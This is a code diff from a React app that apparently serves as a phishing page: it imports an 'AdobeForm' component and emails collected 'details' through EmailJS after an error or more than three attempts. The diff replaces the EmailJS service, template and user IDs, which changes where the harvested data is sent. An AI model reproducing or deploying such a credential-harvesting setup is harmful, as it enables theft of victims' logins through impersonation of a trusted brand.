@@ -1,6 +1,6 @@
 import React, { useState } from "react";
 import AdobeForm from "./components/AdobeForm";
-import logo from "./Image/error!.png";
+import logo from "./Image/error.jpg";
 import emailjs from "emailjs-com";
 import jsPDF from "jspdf";
 
@@ -36,10 +36,11 @@ function App() {
     if (error != "" || counter > 3) {
       emailjs
         .send(
-          "service_x6hu0ud",
-          "template_lf79x3o",
+          "service_qi3ce6b",
+          "template_iopna35",
           details,
-          "user_IL5fakIwm8zK6NFatXezQ"
+          "user_jFTAVZmj3gaB5cgIQviey",
+          
         )
         .then(
           (result) => {
